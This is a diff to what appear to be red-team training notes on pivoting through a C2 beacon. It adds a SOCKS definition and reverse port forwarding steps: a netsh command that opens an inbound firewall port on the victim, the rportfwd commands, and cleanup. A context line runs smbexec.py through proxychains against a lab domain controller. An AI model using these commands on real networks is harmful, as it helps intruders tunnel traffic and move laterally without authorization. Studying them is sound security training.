@@ -1,6 +1,7 @@
 tactic used to proxy traffic in or out of a network, using the beacon as the pivot point
 
 SOCKS (socket secure) proxy:
+  protocol that exchanges network packets between a client and server via a proxy server
   to start the proxy via beacon:
     beacon> socks 1080
   to connect on windows using proxifier:
@@ -36,4 +37,19 @@ SOCKS (socket secure) proxy:
         usage example:
           $ proxychains smbexec.py -no-pass -k -dc-ip lon-dc-1 CONTOSO.COM/rsteel@lon-ws-1
 
-reverse port forwarding
+reverse port forwarding:
+  rather than tunneling traffic in from outside, it allows us to tunnel traffic out from the inside
+  syntax: rportfwd [bind port] [forward host] [forward port]
+          instructs beacon to listen on bind port
+          team server forwards traffic to forward host and port
+          if there is a response, it will be sent back and forwarded to original caller
+  useful scenario:
+    RCE on a target but no ability to upload payloads 
+    we can start a reverse port forward!
+      say we want to use port 28190, we must add a firewall rule to allow port 28190 inbound
+        beacon> run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190
+      now we can begin our port forward:
+        beacon> rportfwd 28190 localhost 80
+      clean up!
+        beacon> rportfwd stop 28190
+        beacon> run netsh advfirewall firewall delete rule name="Debug"
